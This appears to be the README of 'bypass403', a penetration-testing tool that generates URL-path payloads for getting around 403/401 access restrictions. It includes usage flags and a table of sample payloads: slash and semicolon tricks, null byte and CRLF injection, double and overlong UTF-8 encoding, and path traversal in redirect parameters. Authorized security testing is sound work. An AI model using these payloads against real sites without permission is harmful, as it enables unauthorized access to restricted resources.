bypass403

License: MIT

bypass403 generates path-based 403/401 bypass payloads for a given keyword (e.g. admin) — slash tricks, case variation, extension appending, null byte/CRLF, whitespace, URL encoding, double-encoding, unicode homoglyphs, overlong UTF-8, Tomcat semicolon tricks, and more. Payloads are meant to be fed directly into curl, ffuf, httpx, or any HTTP client to test against a target that returns 403 on the plain path.

Resources
Usage
Flags
Categories
Installation
Usage

Examples:

$ python3 bypass403.py admin
$ python3 bypass403.py admin --base-url https://target.com
$ python3 bypass403.py admin --categories slashes,encoding
$ python3 bypass403.py admin --custom "{w}//\..//\"
$ python3 bypass403.py admin --ext json,php,html
$ python3 bypass403.py admin -o payloads.txt

To display the help for the tool use the -h flag:

$ python3 bypass403.py -h
Flags
Flag	Description	Example
--base-url	prefix every generated payload with this base URL	bypass403.py admin --base-url https://target.com
--categories	comma-separated list of categories to generate (default: all)	bypass403.py admin --categories slashes,tomcat
--ext	comma-separated list of extensions used by the extension category (default: json,css,php,html,xml,txt)	bypass403.py admin --ext json,php
--custom	custom payload template using {w} as the keyword placeholder. Repeatable.	bypass403.py admin --custom "{w}//\..//\"
-o, --output	save the generated payloads to a file	bypass403.py admin -o payloads.txt
-h, --help	show help and exit	bypass403.py -h
Categories
Category	What it covers
slashes	/admin/, //admin/, /admin//, ///admin, /admin/., /./admin/./, /admin/..;/
case	/ADMIN, /admin, /AdMiN (alternating case)
extension	/admin.json, /admin.php, /admin.html, ... (see --ext)
suffix	/admin#, /admin?, /admin?foo=bar, /admin?debug=true
nullbyte	/admin%00, /admin%0d%0a
whitespace	/admin%20/, /admin%09/
encoding	full URL-encoded word, single-character-encoded variants
doubleencoding	double URL-encoded variants (%2569 style)
unicode	fullwidth unicode homoglyph version of the word
overlong	overlong UTF-8 encoded slash variants (%c0%af, %c1%9c, ...)
dotencode	/admin%2e/, /admin%2e%2e/
backslash	/admin%5c, /admin\, \admin
doublespace	/admin%2520
tomcat	/admin;.json, /admin;/, /admin.;/
redirect	/admin?redirect=%2fadmin, /admin?path=..%2f..%2fadmin

All path-only techniques — no headers (X-Original-URL, X-Forwarded-For, etc.) or HTTP methods are generated, since those aren't part of the URL itself.

Installation
$ git clone https://github.com/YOUR_USERNAME/bypass403.git
$ cd bypass403
$ python3 bypass403.py -h

No external dependencies — pure standard library.
